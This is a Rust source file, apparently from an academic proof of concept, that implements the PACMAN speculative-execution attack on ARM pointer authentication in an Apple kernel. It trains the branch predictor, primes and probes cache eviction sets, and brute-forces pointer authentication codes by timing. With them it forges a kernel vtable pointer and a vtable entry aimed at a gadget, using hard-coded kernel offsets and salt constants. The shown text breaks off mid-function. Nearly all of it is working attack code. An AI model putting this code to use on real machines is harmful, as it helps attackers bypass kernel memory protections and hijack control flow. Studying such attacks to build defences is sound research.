/*!
 * The PACMAN attack.
 */
use crate::*;
use crate::pac::*;

pub const DATA_EVSET_SIZE : usize = 12;
pub const DATA_MISS_LATENCY : u64 = 42; // 42 for MSR timers 110 for multithreaded
/// How many times to repeat a given trial?
pub const DATA_NUM_ITERS : usize = 8;
/// How many trials to run? (Each trial == a different PAC)
pub const DATA_NUM_TRIALS : usize = 12;

/// How many times do we iterate when inspecting the final set?
/// this can be huge since there aren't going to be a ton of them ideally.
pub const DATA_NUM_FINAL_ITERS : usize = 2048;

/// How far above the first run's average does a run have to be to get marked "significant" for data
pub const DATA_HOW_FAR_ABOVE_AVERAGE : f64 = 4f64;

pub const INST_EVSET_SIZE : usize = 12;
pub const INST_MISS_LATENCY : u64 = 60; // 70 for MSR timers (blr), 65/60 for MSR timers (blraa), 205 for multithreaded

/// How many times to repeat a given trial?
pub const INST_NUM_ITERS : usize = 8;
/// How many trials to run? (Each trial == a different PAC)
pub const INST_NUM_TRIALS : usize = 12;

/// How many times do we iterate when inspecting the final set?
/// this can be huge since there aren't going to be a ton of them ideally.
pub const INST_NUM_FINAL_ITERS : usize = 2048;

pub const LIMIT_EVSET_SIZE : usize = 512;

/// How many bytes into the kernel mach-o does the target `ret` live?
// A gadget from IOSCSIArchitectureModelFamily.kext: 0x26a497c
pub const INST_TARGET_OFFSET : u64 = 0x26a497c; // 0x15739C; // 0x15751C; // 0x154088

/// How far above the first run's average does a run have to be to get marked "significant" for inst
pub const INST_HOW_FAR_ABOVE_AVERAGE : f64 = 4f64;

#[derive(Copy,Clone,Debug,PartialEq)]
struct DirectTarget{
    // The location of the pointer to forge a PAC for
    holder: u64,

    // A known correct value for holder- should point to something other than guess_ptr
    train_ptr: u64,

    // Current guess of the correct value for holder
    guess_ptr: u64,
}

#[derive(Copy,Clone,Debug,PartialEq)]
struct IndirectTarget{
    outer_holder: u64,
    inner_holder: u64,

    // Both of these are known correctly signed pointers
    // train_ptr causes execution to ignore inner_holder, guess_ptr causes execution to evaluate inner_holder
    outer_train_ptr: u64,
    outer_guess_ptr: u64,

    // Current guess of the correct value for inner_holder
    inner_guess_ptr: u64,
}

/// Direct or indirect? Used for abstracting direct/ indirect attacks into one generic method flavor.
enum PacmanAttackTarget {
    Direct(DirectTarget),
    Indirect(IndirectTarget),
}

/**
 * Calculate a salt for a given PAC computation.
 *
 * # Arguments
 * * `holder_addr`: The address holding the PAC'd pointer.
 * * `salt_const`: The salt constant for a given object.
 *
 * # Return Value
 * Returns the correct 64 bit salt for this given context.
 */
pub unsafe fn get_salt(holder_addr: u64, salt_const: u64) -> u64 {
    // Upper 16 bits are the salt_const
    // Need to make sure that bit 47 is set correctly too
    let addr_unmasked = (holder_addr | PAC_BITMASK) & (!0xFFFF000000000000u64);
    return (addr_unmasked | (salt_const << 48u64));
}

/**
 * Helper method to do the address computation to find the victim object in memory,
 * given a IOService that owns an IOUserClient we want to corrupt.
 */
pub unsafe fn find_victim_objects(handle: &PacmanKitConnection) -> (u64, u64, u64, u64) {
    let victim_user_client = handle.get_handle_loc().unwrap();
    let victim_object = victim_user_client + pacmankit::PACMANKIT_TO_HELPER;
    let victim_vtable = handle.kernel_read(victim_object).unwrap();
    let victim_vtable_entry = handle.kernel_read(victim_vtable).unwrap();

    return (victim_user_client, victim_object, victim_vtable, victim_vtable_entry);
}

/**
Run the PACMAN attack on a given pointer and return the access latencies for analysis.

This can be used on either a data pointer or instruction pointer.

# Arguments
* `handle`: A PacmanKitConnection handle (only used for kernel write).
* `holder`: The address holding the pointer to forge (will be written into).
* `known_good`: A known good pointer that can be safely used non-speculatively (has correct PAC).
* `guess_value`: The pointer with a guessed PAC we are checking.
* `time_use_fn`: The function to use for timing a pointer's usage.
* `try_speculative`: A closure to trigger a speculative use of the pointer in `holder`.
* `try_nonspeculative`: A closure to try using (for whatever definition of `using` applies
                           in a given use case)the pointer in `holder` non-speculatively.
* `forge_evset`: An eviction set for the `guess_value` pointer being forged.
* `forge_evset_indexes`: An array of indexes to use to index `forge_evset`. Will be randomized!
* `limit_evset`: An eviction set for the `guess_value` pointer being forged.
* `limit_evset_indexes`: An array of indexes to use to index `limit_evset`. Will be randomized!
# Generics
* `TrySpec`: A closure to try a value speculatively. Can just use `_`.
* `TryNonSpec`: A closure to try a value non-speculatively. Can just use `_`.
* `const` `EVSET_SIZE`: The size of the eviction set.

 # Return Value
 Returns the measured latencies (using `time_use_fn`) of the `prime+probe`'d eviction set.
*/
#[inline(always)]
unsafe fn pacman_try_one<TrySpec, TryNonSpec, const EVSET_SIZE: usize>(
    handle: &PacmanKitConnection,

    // Address of the pointer to forge (where the pointer will be saved in memory):
    holder: u64,

    // A known good value (can be used non-speculatively) that can be written into holder:
    known_good: u64,

    // The pointer we are guessing our PAC is correct for:
    guess_value: u64,

    // Generic functions to test the pointer:
    time_use_fn: unsafe fn(u64) -> u64,
    try_speculative: TrySpec,
    try_nonspeculative: TryNonSpec,

    // Eviction sets:
    forge_evset: &Vec<u64>,
    forge_evset_indexes: &mut Vec<usize>,
    limit_evset: &Vec<u64>,
    limit_evset_indexes: &mut Vec<usize>,
) -> [u64; EVSET_SIZE] where
    TrySpec: Fn(), TryNonSpec: Fn() {

    // 0. Throw off the prefetcher if you want (I found this was unnecessary)
    // forge_evset_indexes.shuffle(&mut thread_rng());
    // limit_evset_indexes.shuffle(&mut thread_rng());

    // 1. Train branch predictor on known good pointer
    handle.kernel_write(holder | PAC_BITMASK, known_good);
    for i in 0..12 {
        try_nonspeculative();
    }

    // 2. Write guess
    handle.kernel_write(holder | PAC_BITMASK, guess_value);

    // 3. Evict LIMIT- this is ALWAYS a data access!
    for i in 0..limit_evset_indexes.len() {
        timer::time_access(limit_evset[limit_evset_indexes[i]]);
    }

    // 4. Prime the cache
    for i in 0..EVSET_SIZE {
        time_use_fn(forge_evset[forge_evset_indexes[i]]);
    }

    // 5. Try guess (speculatively)
    try_speculative();

    // 6. Probe (go backwards with .rev() if you want to prevent self-eviction!)
    let mut times = [0; EVSET_SIZE];
    for i in (0..EVSET_SIZE) {
        times[i] = time_use_fn(forge_evset[forge_evset_indexes[i]]);
    }

    // 7. Cleanup nicely
    handle.kernel_write(holder | PAC_BITMASK, known_good);

    return times;
}

/**
 * Does one run of a PACMAN trial where the pointer in question can be directly written to for a trial.
 *
 * This is in contrast to the indirect case where the pointer to test is in a region that
 * needs to be swapped (aka a vtable entry).
 *
 * See `pacman_try_one` and `pacman_differentiate_direct` for documentation on the interfaces exposed by this method.
 * This method is intended to be used as a helper routine for bruteforcing/ differentiating on direct gadgets (data or inst).
 */
#[inline(always)]
unsafe fn pacman_direct<
    TrySpec,
    TryNonSpec,
    const NUM_ITERS: usize,
    const EVSET_SIZE: usize,
    const MISS_LATENCY: u64
> (
    handle: &PacmanKitConnection,
    holder: u64,

    // Used to train the branch predictor (non-speculatively!)
    train_ptr : u64,

    // Used speculatively as part of the PACMAN attack. Should point to different memory than `train_ptr`.
    guess_ptr : u64,

    // Generic functions to test the pointer:
    time_use_fn: unsafe fn(u64) -> u64,
    try_speculative: TrySpec,
    try_nonspeculative: TryNonSpec,

    // Eviction sets:
    forge_evset: &Vec<u64>,
    forge_evset_indexes: &mut Vec<usize>,
    limit_evset: &Vec<u64>,
    limit_evset_indexes: &mut Vec<usize>,
) -> [u64; NUM_ITERS] where TrySpec: Fn(), TryNonSpec: Fn() {
    let mut samples = [0; NUM_ITERS];

    for iteration in 0..NUM_ITERS {
        // Run a single test case
        let mut times = pacman_try_one::<_, _, EVSET_SIZE>(
            &handle,
            holder,
            train_ptr,
            guess_ptr,
            time_use_fn,
            &try_speculative,
            &try_nonspeculative,
            forge_evset,
            forge_evset_indexes,
            limit_evset,
            limit_evset_indexes,
        );

        // Record the number of misses
        // @TODO: Replace samples with an array of buckets for different miss counts
        let mut misses = 0;
        for i in 0..EVSET_SIZE {
            if times[i] > MISS_LATENCY {
                misses += 1;
            }
        }
        samples[iteration] = misses;

        // Sometimes it's helpful to print the actual latencies out:
        // times.sort();
        // println!("{:?}", times);
    }

    return samples;
}

/**
 * Does one run of a PACMAN trial where the pointer in question cannot be directly written to for a trial.
 * However, by writing to a different pointer we have a good signature for, we can control whether our guess pointer is evaluated speculatively.
 *
 * The quintessential example of when this might be useful is for forging vtables- we cannot copy good vtable entries from
 * the old vtable to put in our forged vtable as moving a signed pointer invalidates it (due to salts being address dependent).
 *
 * This becomes an indirect PACMAN gadget once we forge the correct data pointer used to point to our forged vtable. The following happens:
 *
 * 1. We update the forged vtable with our new guess.
 * 2. We swap the old vtable pointer for the forged one we got from a Direct PACMAN gadget.
 * 3. We speculatively use our new vtable with our guess entry, passing through the already-bruteforced pointer.
 *
 * The following diagram explains this:
 *
 * ```text
 *                         +--------------+
 *                    +->  |  Known Good  |  <- Train on this
 *                    |    +--------------+
 * +--------------+   |
 * | Outer Holder |  -? Are we training or testing?
 * +--------------+   |
 *                    |    +--------------+
 *                    +->  | Inner Holder |  <- Test on this
 *                         +--------------+
 * ```
 *
 * We load `outer_holder` with the value `outer_train_ptr`, which should cause the outer holder to point to an address
 * containing a known good pointer that can be dereferenced. In the context of C++ vtables, this means `outer_train_ptr`
 * is the appropriate signed pointer for `outer_holder` that points to the original object vtable. We train like this.
 *
 * During a test, we swap `outer_holder` for `outer_guess_ptr` which causes the outer holder to point to our guess value.
 * This should be a correctly signed pointer for outer holder! (Forge it using `pacman_direct`). In the context of C++
 * vtables, this would be a data pointer we already forged pointing to our fake vtable.
 *
 * `inner_holder` is the address inside of the new memory region we want to bruteforce a pointer in. We will write our guess
 * of the new pointer into `inner_holder`. This guess does not need to be correct as it will only be evaluated speculatively
 * of course. `inner_guess_ptr` contains this guess value. In the C++ vtable example, this would point to our code gadget we'd
 * like to run, with a PAC guess in the upper bits.
 *
 * This is in contrast to the direct case where the pointer to test can just be trained on as we have a good pointer for that slot.
 *
 * See `pacman_try_one` for documentation on the interfaces exposed by this method.
 * This method is intended to be used as a helper routine for bruteforcing/ differentiating on indirect gadgets (data or inst).
 */
#[inline(always)]
unsafe fn pacman_indirect<
    TrySpec,
    TryNonSpec,
    const NUM_ITERS: usize,
    const EVSET_SIZE: usize,
    const MISS_LATENCY: u64
> (
    handle: &PacmanKitConnection,

    // The holders for our two pointers:
    outer_holder: u64,
    inner_holder: u64,

    // Used to train the branch predictor (non-speculatively!)
    outer_train_ptr : u64,
    outer_guess_ptr : u64,

    inner_guess_ptr: u64,

    // Generic functions to test the pointer:
    time_use_fn: unsafe fn(u64) -> u64,
    try_speculative: TrySpec,
    try_nonspeculative: TryNonSpec,

    // Eviction sets:
    forge_evset: &Vec<u64>,
    forge_evset_indexes: &mut Vec<usize>,
    limit_evset: &Vec<u64>,
    limit_evset_indexes: &mut Vec<usize>,
) -> [u64; NUM_ITERS] where TrySpec: Fn(), TryNonSpec: Fn() {
    let mut samples = [0; NUM_ITERS];

    for iteration in 0..NUM_ITERS {
        // Write our guess into the inner holder
        handle.kernel_write(inner_holder, inner_guess_ptr);

        // Run a single test case, training with outer_holder set to outer_train_ptr
        // And then swapping to outer_guess_ptr when our test arrives (the caller should
        // ensure this causes inner_holder to be speculatively used).
        let mut times = pacman_try_one::<_, _, EVSET_SIZE>(
            &handle,
            outer_holder,
            outer_train_ptr,
            outer_guess_ptr,
            time_use_fn,
            &try_speculative,
            &try_nonspeculative,
            forge_evset,
            forge_evset_indexes,
            limit_evset,
            limit_evset_indexes,
        );

        // Record the number of misses
        // @TODO: Replace samples with an array of buckets for different miss counts
        let mut misses = 0;
        for i in 0..EVSET_SIZE {
            if times[i] > MISS_LATENCY {
                misses += 1;
            }
        }
        samples[iteration] = misses;

        // Sometimes it's helpful to print the actual latencies out:
        // times.sort();
        // println!("{:?}", times);
    }

    return samples;
}

/**
Attempt to differentiate a correct PAC vs incorrect PAC.

This should be used before bruteforcing to ensure the parameters are configured correctly
(incorrect PAC and correct PAC should have clearly different miss patterns produced by this function).

This function also takes a third pointer (`train_ptr`) that is also correctly signed but points to **different** memory
than either incorrect/ correct ptr. This pointer is used non-speculatively during training!

This function will run the PACMAN attack on either a correct or incorrect pointer randomly and then print the results of the trial.
The resulting data should produce different distributions for the two cases (correct or incorrect).

This function works for direct cases (where the pointer being swapped out is the pointer under test) or indirect cases
(where the pointer being tested lives within a new memory region we don't have a train ptr for (aka a vtable situation)).

# Generic Arguments
* `TrySpec`: A closure to try a value speculatively. Can just use `_`.
* `TryNonSpec`: A closure to try a value non-speculatively. Can just use `_`.
* `NUM_TRIALS`: How many trials to run? Each trial is a grouping of `NUM_ITERS` calls to `pacman_try_one`. Each trial either uses a correct / incorrect pointer.
* `NUM_ITERS`: How many times to test a given pointer (with `pacman_try_one`) before calling it quits? More == more accurate but takes longer.
* `EVSET_SIZE`: How large of an eviction set should we use?
* `MISS_LATENCY`: What timer reading constitutes a cache miss?

# Arguments
* `handle`: An open PacmanKitConnection handle (passed onto `pacman_try_one` for the arbitrary kernel write primitive).
* `holder`: The address holding the pointer to forge (either `correct_ptr` or `incorrect_ptr` will be written here). `incorrect_ptr` will only be used speculatively.
* `correct_ptr`: The correctly signed pointer to test.
* `incorrect_ptr`: An incorrectly signed pointer to test.
* `time_use_fn`: The function to use for timing a pointer's usage.
* `try_speculative`: A closure to trigger a speculative use of the pointer in `holder`.
* `try_nonspeculative`: A closure to try using (for whatever definition of `using` applies
                           in a given use case)the pointer in `holder` non-speculatively.
* `forge_evset`: An eviction set for the `guess_value` pointer being forged.
* `forge_evset_indexes`: An array of indexes to use to index `forge_evset`. Will be randomized!
* `limit_evset`: An eviction set for the `guess_value` pointer being forged.
* `limit_evset_indexes`: An array of indexes to use to index `limit_evset`. Will be randomized!
*/
unsafe fn pacman_differentiate<
    TrySpec,
    TryNonSpec,
    const NUM_TRIALS: usize,
    const NUM_ITERS: usize,
    const EVSET_SIZE: usize,
    const MISS_LATENCY: u64
> (
    handle: &PacmanKitConnection,

    // Either direct or indirect- this has all the info on our target object
    victim: PacmanAttackTarget,

    // We ignore the guess fields of the victim PacmanAttackTarget and instead defer to these:
    correct_ptr: u64,
    incorrect_ptr: u64,

    // Generic functions to test the pointer:
    time_use_fn: unsafe fn(u64) -> u64,
    try_speculative: TrySpec,
    try_nonspeculative: TryNonSpec,

    // Eviction sets:
    forge_evset: &Vec<u64>,
    forge_evset_indexes: &mut Vec<usize>,
    limit_evset: &Vec<u64>,
    limit_evset_indexes: &mut Vec<usize>,
) where TrySpec: Fn(), TryNonSpec: Fn() {
    // results[x][y] contains the number of misses observed for a given trial
    // x is the trial number, and y is the subtrial number
    // For a given x, we always do either correct or incorrect PAC according to use_correct_pac
    let mut results = [[0; NUM_ITERS]; NUM_TRIALS];

    let mut use_correct_pac = [false; NUM_TRIALS];
    for i in 0..NUM_TRIALS {
        use_correct_pac[i] = crandom::rand() % 2 == 0;
    }

    // Always ensure we get one false and one true
    use_correct_pac[0] = false;
    use_correct_pac[1] = true;

    for trial in 0..NUM_TRIALS {
        let value_to_use = if use_correct_pac[trial] {correct_ptr} else {incorrect_ptr};

        let samples = match victim {
            PacmanAttackTarget::Direct(target) =>
                pacman_direct::<_, _, NUM_ITERS, EVSET_SIZE, MISS_LATENCY>(
                    &handle,
                    target.holder,
                    target.train_ptr,
                    value_to_use,
                    time_use_fn,
                    &try_speculative,
                    &try_nonspeculative,
                    forge_evset,
                    forge_evset_indexes,
                    limit_evset,
                    limit_evset_indexes
                ),

            PacmanAttackTarget::Indirect(target) =>
                pacman_indirect::<_, _, NUM_ITERS, EVSET_SIZE, MISS_LATENCY>(
                    &handle,
                    target.outer_holder,
                    target.inner_holder,

                    target.outer_train_ptr,
                    target.outer_guess_ptr,

                    value_to_use,

                    time_use_fn,
                    &try_speculative,
                    &try_nonspeculative,
                    forge_evset,
                    forge_evset_indexes,
                    limit_evset,
                    limit_evset_indexes
                ),
        };

        results[trial] = samples;
    }

    // Post-process and print out results for graphing/ testing
    for i in 0..NUM_TRIALS {
        if use_correct_pac[i] {
            print!("[*] ");
        }
        else {
            print!("[x] ");
        }

        results[i].sort();
        let mut avg : f64 = 0.0;
        let mut total : u64 = 0;
        for j in 0..results[i].len() {
            avg += results[i][j] as f64;
            total += results[i][j]
        }
        avg /= results[i].len() as f64;
        let median = results[i][results[i].len() / 2];
        let max = results[i][results[i].len() - 2];
        let min = results[i][2];
        print!("{}, {}, {}, {}, {}\t", min, median, max, avg, total);
        println!("{:?}", results[i]);
    }
}

pub const HOW_FAR_ABOVE_AVERAGE : f64 = 4.0f64;

unsafe fn pacman_bruteforce<
    TrySpec,
    TryNonSpec,
    const NUM_TRIALS: usize,
    const NUM_ITERS: usize,
    // Number of iterations to run on the potential matches to determine if they are good or not
    const NUM_FINAL_ITERS: usize,
    const EVSET_SIZE: usize,
    const MISS_LATENCY: u64
> (
    handle: &PacmanKitConnection,

    // All the information we need to know about the object under test
    victim: PacmanAttackTarget,

    // Generic functions to test the pointer:
    time_use_fn: unsafe fn(u64) -> u64,
    try_speculative: TrySpec,
    try_nonspeculative: TryNonSpec,

    // Eviction sets:
    forge_evset: &Vec<u64>,
    forge_evset_indexes: &mut Vec<usize>,
    limit_evset: &Vec<u64>,
    limit_evset_indexes: &mut Vec<usize>,
) -> Option<u64> where TrySpec: Fn(), TryNonSpec: Fn() {

    let mut NUM_MISS_SIGNIFICANT : f64 = 0.0;
    let mut potential_matches : Vec<u64> = Vec::new();

    // Pull the target out of the victim object
    let forge_me = match victim {
        PacmanAttackTarget::Direct(target) => target.guess_ptr,
        PacmanAttackTarget::Indirect(target) => target.inner_guess_ptr,
    };

    let mut num_trials_complete = 0;
    for pac_guess in pac::iterate_pacs(forge_me) {
        let value_to_use = pac_guess;

        let mut samples = match victim {
            PacmanAttackTarget::Direct(target) =>
                pacman_direct::<_, _, NUM_ITERS, EVSET_SIZE, MISS_LATENCY>(
                    &handle,
                    target.holder,
                    target.train_ptr,
                    value_to_use,
                    time_use_fn,
                    &try_speculative,
                    &try_nonspeculative,
                    forge_evset,
                    forge_evset_indexes,
                    limit_evset,
                    limit_evset_indexes
                ),

            PacmanAttackTarget::Indirect(target) =>
                pacman_indirect::<_, _, NUM_ITERS, EVSET_SIZE, MISS_LATENCY>(
                    &handle,
                    target.outer_holder,
                    target.inner_holder,

                    target.outer_train_ptr,
                    target.outer_guess_ptr,

                    value_to_use,

                    time_use_fn,
                    &try_speculative,
                    &try_nonspeculative,
                    forge_evset,
                    forge_evset_indexes,
                    limit_evset,
                    limit_evset_indexes
                ),
        };

        // Parse results, add to potential_matches, potentially
        samples.sort();
        let mut avg : f64 = 0.0;
        let mut total : u64 = 0;
        for j in 0..samples.len() {
            avg += samples[j] as f64;
            total += samples[j];
        }
        avg /= (samples.len()) as f64;
        let median = samples[(samples.len()) / 2];
        let min = samples[2];

        if num_trials_complete == 0 {
            // @TODO: while the observed average isn't great, regenerate eviction set :)
            NUM_MISS_SIGNIFICANT = avg + HOW_FAR_ABOVE_AVERAGE;

            if NUM_MISS_SIGNIFICANT > (EVSET_SIZE as f64) {
                println!("Asking for an impossibly high average, rounding down");
                NUM_MISS_SIGNIFICANT = EVSET_SIZE as f64;
            }
            println!("The number to beat is {} misses", NUM_MISS_SIGNIFICANT);
        }

        // if pac_guess == correct_signed_new_vtable_ptr || num_trials_complete == 0 {
        //     print!("{}, {}, {}, {}\t", min, median, avg, total);
        //     println!("{:?}", samples);
        // }

        if (avg >= (NUM_MISS_SIGNIFICANT - (HOW_FAR_ABOVE_AVERAGE as f64 / 2.0)) as f64) {
            print!("{}, {}, {}, {}\t", min, median, avg, total);
            println!("{:?}", samples);
            println!("Found a potential match: 0x{:X}", pac_guess);
            potential_matches.push(pac_guess);
        }

        num_trials_complete+=1;

        if num_trials_complete % 6556 == 0 {
            println!("{}%...", (100 * num_trials_complete) / 65536);
        }
    }

    println!("Found {} potential matches", potential_matches.len());

    if potential_matches.len() == 0 {
        return None;
    }

    // Track the total number of misses of every potential match
    // For the ones we think are potentially correct, record the value + total number of misses
    // Report the one with the most misses
    let mut final_matches : Vec<(u64, u64)> = Vec::new();

    for potential_match in potential_matches {
        let value_to_use = potential_match;

        let mut samples = match victim {
            PacmanAttackTarget::Direct(target) =>
                pacman_direct::<_, _, NUM_FINAL_ITERS, EVSET_SIZE, MISS_LATENCY>(
                    &handle,
                    target.holder,
                    target.train_ptr,
                    value_to_use,
                    time_use_fn,
                    &try_speculative,
                    &try_nonspeculative,
                    forge_evset,
                    forge_evset_indexes,
                    limit_evset,
                    limit_evset_indexes
                ),

            PacmanAttackTarget::Indirect(target) =>
                pacman_indirect::<_, _, NUM_FINAL_ITERS, EVSET_SIZE, MISS_LATENCY>(
                    &handle,
                    target.outer_holder,
                    target.inner_holder,

                    target.outer_train_ptr,
                    target.outer_guess_ptr,

                    value_to_use,

                    time_use_fn,
                    &try_speculative,
                    &try_nonspeculative,
                    forge_evset,
                    forge_evset_indexes,
                    limit_evset,
                    limit_evset_indexes
                ),
        };

        // Parse results, break if we found it
        samples.sort();
        let mut avg : f64 = 0.0;
        let mut total : u64 = 0;
        for j in 0..samples.len() {
            avg += samples[j] as f64;
            total += samples[j];
        }
        avg /= (samples.len()) as f64;
        let median = samples[(samples.len()) / 2];
        let min = samples[2];

        print!("{}, {}, {}, {}\t", min, median, avg, total);
        // println!("{:?}", samples);
        println!("Inspecting potential candidate: 0x{:X}", potential_match);

        if (avg >= NUM_MISS_SIGNIFICANT as f64) {
            final_matches.push((total, potential_match));
        }
    }

    final_matches.sort_by_key(|k| k.0);
    println!("{:?}", final_matches);

    let final_pac = final_matches[final_matches.len() - 1].1;

    println!("Final answer: 0x{:X}", final_pac);
    return Some(final_pac);
}

/**
 * Data version of the PACMAN attack.
 *
 * # Bruteforce Mode
 * Returns the correct PAC that we found.
 * Note that currently that PAC is useless since the victim handle
 * drops when it goes out of scope (when we leave this fn).
 */
pub unsafe fn data_testing(memory_region: &mut [u8], do_bruteforce: bool) {
    // Handle is used for interfacing with PacmanKit
    let handle = PacmanKitConnection::init().unwrap();

    // Victim handle gives us a victim IOUserClient to exploit
    let victim_handle = PacmanKitConnection::init().unwrap();

    // Locate target object
    let (victim_user_client, victim_object, victim_vtable, victim_vtable_entry) = find_victim_objects(&victim_handle);

    // Setup fake vtable (bring it into the cache)
    let new_vtable = handle.kernel_mmap().unwrap() | PAC_BITMASK;
    handle.kernel_read(new_vtable).unwrap();

    // Original value to put in [victim_object]:
    let original_signed_vtable_ptr = victim_vtable;

    // Correct PAC we want to find:
    let salt_data = get_salt(victim_object | PAC_BITMASK, 0xd986);
    let correct_signed_new_vtable_ptr = handle.forge_sign_data(new_vtable | PAC_BITMASK, salt_data).unwrap();
    let correct_pac = pac::extract_pac(correct_signed_new_vtable_ptr);

    // Setup evset for LIMIT
    let limit_va = handle.leak_limit_location().unwrap();
    let limit_pa = handle.kernel_virt_to_phys(limit_va).unwrap();
    let limit_evset = evset::data_pevset(limit_va, limit_pa, memory_region);
    let mut limit_evset_chosen : Vec<u64> = limit_evset.choose_multiple(&mut rand::thread_rng(), LIMIT_EVSET_SIZE).into_iter().cloned().collect();
    let mut limit_indexes : Vec<usize> = (0..limit_evset_chosen.len()).collect();

    // Setup evset for the vtable (success data pointer)
    let new_vtable_va = new_vtable;
    let new_vtable_pa = handle.kernel_virt_to_phys(new_vtable_va).unwrap();
    let new_vtable_evset = evset::data_pevset(new_vtable_va, new_vtable_pa, memory_region);
    let mut new_vtable_evset_chosen : Vec<u64> = new_vtable_evset.choose_multiple(&mut rand::thread_rng(), DATA_EVSET_SIZE).into_iter().cloned().collect();
    let mut new_vtable_indexes : Vec<usize> = (0..new_vtable_evset_chosen.len()).collect();

    let try_speculative = || {
        victim_handle.call_service_routine(10000, 0, 0, 0, 0, 0);
    };

    let try_nonspeculative = || {
        victim_handle.call_service_routine(0, 0, 0, 0, 0, 0);
    };

    let target = PacmanAttackTarget::Direct(
        DirectTarget{
            holder: victim_object,
            train_ptr: original_signed_vtable_ptr,
            guess_ptr: new_vtable | PAC_BITMASK,
        }
    );

    if !do_bruteforce {
        // Generate an incorrect PAC to compare against
        let incorrect_pac = correct_pac ^ (crandom::rand() as u16 % pac::MAX_PAC);
        let incorrect_signed_new_vtable_ptr = pac::encode_pac(incorrect_pac, correct_signed_new_vtable_ptr | PAC_BITMASK);

        assert_ne!(correct_pac, incorrect_pac);
        assert_ne!(correct_signed_new_vtable_ptr, incorrect_signed_new_vtable_ptr);

        // Try just one correct and one incorrect, see if we can tell them apart:
        println!("Forging vtable pointer in PacmanKitService");
        println!("\tOriginal pointer:      0x{:X} (pac is 0x{:X})", original_signed_vtable_ptr, pac::extract_pac(original_signed_vtable_ptr));
        println!("\tCorrect new pointer:   0x{:X} (pac is 0x{:X})", correct_signed_new_vtable_ptr, pac::extract_pac(correct_signed_new_vtable_ptr));
        println!("\tIncorrect new pointer: 0x{:X} (pac is 0x{:X})", incorrect_signed_new_vtable_ptr, pac::extract_pac(incorrect_signed_new_vtable_ptr));
        pacman_differentiate::<_, _, DATA_NUM_TRIALS, DATA_NUM_ITERS, DATA_EVSET_SIZE, DATA_MISS_LATENCY>(
            &handle,
            target,
            correct_signed_new_vtable_ptr,
            incorrect_signed_new_vtable_ptr,
            timer::time_access,
            try_speculative,
            try_nonspeculative,
            &new_vtable_evset_chosen,
            &mut new_vtable_indexes,
            &limit_evset_chosen,
            &mut limit_indexes
        );
    }
    else {
        println!("Brute-forcing vtable pointer in PacmanKitService");
        println!("\tOriginal pointer:      0x{:X} (pac is 0x{:X})", original_signed_vtable_ptr, pac::extract_pac(original_signed_vtable_ptr));
        println!("\tWant to find:          0x{:X} (pac is 0x{:X})", correct_signed_new_vtable_ptr, pac::extract_pac(correct_signed_new_vtable_ptr));
        pacman_bruteforce::<_, _, DATA_NUM_TRIALS, DATA_NUM_ITERS, DATA_NUM_FINAL_ITERS, DATA_EVSET_SIZE, DATA_MISS_LATENCY>(
            &handle,
            target,
            timer::time_access,
            try_speculative,
            try_nonspeculative,
            &new_vtable_evset_chosen,
            &mut new_vtable_indexes,
            &limit_evset_chosen,
            &mut limit_indexes
        );
    }
}

/**
 * Instruction version of the PACMAN attack.
 */
 pub unsafe fn inst_testing(memory_region: &mut [u8], do_bruteforce: bool) {
    // Handle is used for interfacing with PacmanKit
    let handle = PacmanKitConnection::init().unwrap();

    // Victim handle gives us a victim IOUserClient to exploit
    let victim_handle = PacmanKitConnection::init().unwrap();

    // Locate target object
    let (victim_user_client, victim_object, victim_vtable_original, victim_vtable_entry) = find_victim_objects(&victim_handle);

    // Setup fake vtable with data PAC oracle (later we will use PACMAN for this too)
    // We are trying to guess the correct value INSIDE the vtable (not the vtable ptr itself) so it's ok to "cheat" here
    // as long as we use the data PACMAN attack to find this value in the real attack.
    // So the data attack needs to produce exactly one value (new_vtable_signed).
    let new_vtable = (handle.kernel_mmap().unwrap() | PAC_BITMASK) + 0x24c940;
    let new_vtable_salt = get_salt(victim_object | PAC_BITMASK, 0xd986);
    let new_vtable_signed = handle.forge_sign_data(new_vtable, new_vtable_salt).unwrap();

    // Locate win() somewhere in the kernel retpoline (now a NOP sled!)
    let win = handle.leak_retpoline().unwrap() | PAC_BITMASK + 0x30c0;

    // This is the salt to use for any pointers put into the forged vtable:
    let salt_inst = get_salt(new_vtable | PAC_BITMASK, 0xa7d5);

    // Correct PAC we want to find:
    let correct_signed_new_vtable_entry = handle.forge_sign_inst(win | PAC_BITMASK, salt_inst).unwrap();
    let correct_pac = pac::extract_pac(correct_signed_new_vtable_entry);

    // Setup evset for LIMIT
    let limit_va = handle.leak_limit_location().unwrap();
    let limit_pa = handle.kernel_virt_to_phys(limit_va).unwrap();
    let limit_evset = evset::data_pevset(limit_va, limit_pa, memory_region);
    let mut limit_evset_chosen : Vec<u64> = limit_evset.choose_multiple(&mut rand::thread_rng(), LIMIT_EVSET_SIZE).into_iter().cloned().collect();
    let mut limit_indexes : Vec<usize> = (0..limit_evset_chosen.len()).collect();

    // Setup evset for win() (success inst pointer)
    let win_va = win;
    let win_pa = handle.kernel_virt_to_phys(win_va).unwrap();
    let win_evset = evset::inst_pevset(win_va, win_pa, memory_region);
    let mut win_evset_chosen : Vec<u64> = win_evset.choose_multiple(&mut rand::thread_rng(), INST_EVSET_SIZE).into_iter().cloned().collect();
    let mut win_indexes : Vec<usize> = (0..win_evset_chosen.len()).collect();

    limit_evset_chosen.sort();
    win_evset_chosen.sort();

    let mut results = [[0; INST_NUM_ITERS]; INST_NUM_TRIALS];

    // Use a giant retpoline to flush the L1 iCache
    let mut retpoline_l1i_as_ptr : *mut u8 = 0 as *mut u8;
    let kret = mach::mach_vm_allocate(
        mach::mach_task_self(),
        &mut retpoline_l1i_as_ptr,
        cache::L2_SIZE,
        VM_FLAGS_ANYWHERE
    );

    let err_str = CStr::from_ptr(mach_error_string(kret));
    if KERN_SUCCESS != kret {
        println!("Error creating L1 iCache retpoline memory region! ({}). Error is {:?}", kret, err_str);
        return;
    }

    // For flush_iCache:
    let retpoline_l1i = (retpoline_l1i_as_ptr as u64) & (!PAC_BITMASK);
    retpoline::mk_retpoline_addr(retpoline_l1i as u64, cache::L2_SIZE);

    let try_speculative = || {
        victim_handle.call_service_routine(10000, 0, 0, 0, 0, 0);
    };

    let try_nonspeculative = || {
        victim_handle.call_service_routine(0, 0, 0, 0, 0, 0);
    };

    // Forge non-speculatively (for testing):
    // handle.kernel_write(victim_vtable, correct_signed_new_vtable_entry);
    // try_nonspeculative();
    // loop{}

    let target = PacmanAttackTarget::Indirect(
        IndirectTarget{
            outer_holder: victim_object,
            inner_holder: new_vtable,
            outer_train_ptr: victim_vtable_original,
            outer_guess_ptr: new_vtable_signed,

